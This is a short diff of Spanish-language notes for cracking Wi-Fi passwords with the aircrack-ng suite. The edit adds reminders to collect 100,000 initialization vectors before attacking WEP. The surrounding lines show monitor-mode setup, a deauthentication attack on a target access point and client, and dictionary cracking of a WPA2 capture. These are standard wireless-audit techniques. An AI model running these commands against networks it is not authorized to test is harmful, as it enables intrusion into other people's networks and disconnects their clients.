@@ -37,7 +37,9 @@ sudo aireplay-ng -0 10 -a $bssid -c $cliente wlan0
 sudo aircrack-ng -0 -w Documents/crackstation.txt wpa2-01.cap
 
 
-###### WEP con clientes OpenSystem ##############
+###### WEP con clientes OpenSystem ############## 
+
+OJO!! ver que en la data de la captura haya 100.000 VI, Vectores de Inicialización 
 
 airmon-ng start wlan0
 airmon-ng check kill
@@ -68,6 +70,7 @@ aircrack-ng -0 $captura.cap
 
 
 ###### WEP sin clientes OpenSystem ###################
+OJO!! ver que en la data de la captura haya 100.000 VI, Vectores de Inicialización 
 
 airmon-ng start wlan0
 airmon-ng check kill
@@ -92,6 +95,7 @@ aircrack-ng -0 $captura
 
 
 ### WEP con clientes 'SKA' Shared Key Authentication
+OJO!! ver que en la data de la captura haya 100.000 VI, Vectores de Inicialización 
 
 airmon-ng start wlan0
 airmon-ng check kill
